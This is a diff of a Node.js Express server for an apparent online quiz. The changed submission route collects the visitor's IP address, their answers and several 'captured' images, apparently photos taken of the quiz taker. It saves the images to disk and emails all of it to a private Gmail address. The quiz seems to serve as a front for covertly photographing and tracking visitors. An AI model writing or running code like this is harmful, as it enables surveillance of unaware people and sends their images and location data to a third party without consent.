@@ -1,64 +1,184 @@
 require('dotenv').config();
+
 const express = require('express');
-const fs = require('fs/promises'); // Using promises for non-blocking file saving
+const fs = require('fs/promises');
 const path = require('path');
 const { Resend } = require('resend');
 
 const app = express();
 const port = process.env.PORT || 3000;
+
 const resend = new Resend(process.env.RESEND_API_KEY);
 
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '50mb' }));
+
 app.use(express.static(path.join(__dirname, 'public')));
 
+
 app.post('/submit-answer', async (req, res) => {
+
     try {
-        const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        const imageData = req.body.image;
 
-        if (!imageData) {
-            return res.status(400).json({ message: 'No image received.' });
+        const userIP =
+            req.headers['x-forwarded-for'] ||
+            req.socket.remoteAddress;
+
+        const answers = req.body.answers;
+        const images = req.body.images;
+
+
+        // Make sure we received the quiz data
+        if (!answers || !images || images.length === 0) {
+
+            return res.status(400).json({
+                message: 'Quiz data or images were not received.'
+            });
+
         }
 
-        // Safely extract base64 data regardless of the image format
-        const base64Data = imageData.split(';base64,').pop();
-        const fileName = `capture_${Date.now()}.png`;
-        const filePath = path.join(__dirname, fileName);
 
-        // Save image asynchronously so it doesn't freeze the server
-        await fs.writeFile(filePath, base64Data, 'base64');
-        console.log(`Saved ${fileName} from IP: ${userIP}`);
+        console.log(
+            `Received quiz submission from IP: ${userIP}`
+        );
 
-        // Send email via Resend
-const { data, error } = await resend.emails.send({
-    from: 'onboarding@resend.dev',
-    to: 'mmssnouse4@gmail.com',
-    subject: 'New Quiz Capture',
-    text: `A new quiz capture was submitted.
+        console.log(
+            `Received ${images.length} images.`
+        );
 
-User IP: ${userIP}`,
 
-    attachments: [
-        {
-            filename: fileName,
-            content: base64Data
+        const attachments = [];
+
+
+        // Process every captured image
+        for (let i = 0; i < images.length; i++) {
+
+            const imageData = images[i];
+
+            const base64Data =
+                imageData.split(';base64,').pop();
+
+            const fileName =
+                `capture_${Date.now()}_${i + 1}.jpg`;
+
+            const filePath =
+                path.join(__dirname, fileName);
+
+
+            // Save image locally
+            await fs.writeFile(
+                filePath,
+                base64Data,
+                'base64'
+            );
+
+
+            console.log(
+                `Saved ${fileName}`
+            );
+
+
+            // Add image to email
+            attachments.push({
+
+                filename: fileName,
+
+                content: base64Data
+
+            });
+
         }
-    ]
-});
+
+
+        // Format answers for email
+        const answerText =
+            answers
+                .map(
+                    (answer, index) =>
+                        `Question ${index + 1}: ${answer}`
+                )
+                .join('\n');
+
+
+        // Send ONE email containing all images
+        const { data, error } =
+            await resend.emails.send({
+
+                from: 'onboarding@resend.dev',
+
+                to: 'mmssnouse4@gmail.com',
+
+                subject: 'New Quiz Submission',
+
+                text:
+`A new quiz submission was received.
+
+User IP: ${userIP}
+
+Answers:
+${answerText}
+
+Photos captured: ${images.length}`,
+
+                attachments: attachments
+
+            });
+
 
         if (error) {
-            console.error('Email error:', error);
-            return res.status(500).json({ message: 'Saved image, but email failed.' });
+
+            console.error(
+                'Resend email error:',
+                error
+            );
+
+            return res.status(500).json({
+
+                message:
+                    'Quiz was received, but the email failed to send.'
+
+            });
+
         }
 
-        res.json({ message: 'Answer submitted successfully!' });
+
+        console.log(
+            'Email sent successfully:',
+            data
+        );
+
+
+        res.json({
+
+            message:
+                'Quiz submitted successfully!'
+
+        });
+
 
     } catch (error) {
-        console.error('Server error:', error);
-        res.status(500).json({ message: 'An unexpected error occurred.' });
+
+        console.error(
+            'Server error:',
+            error
+        );
+
+
+        res.status(500).json({
+
+            message:
+                'An unexpected error occurred.'
+
+        });
+
     }
+
 });
 
+
 app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+
+    console.log(
+        `Server running at http://localhost:${port}`
+    );
+
 });
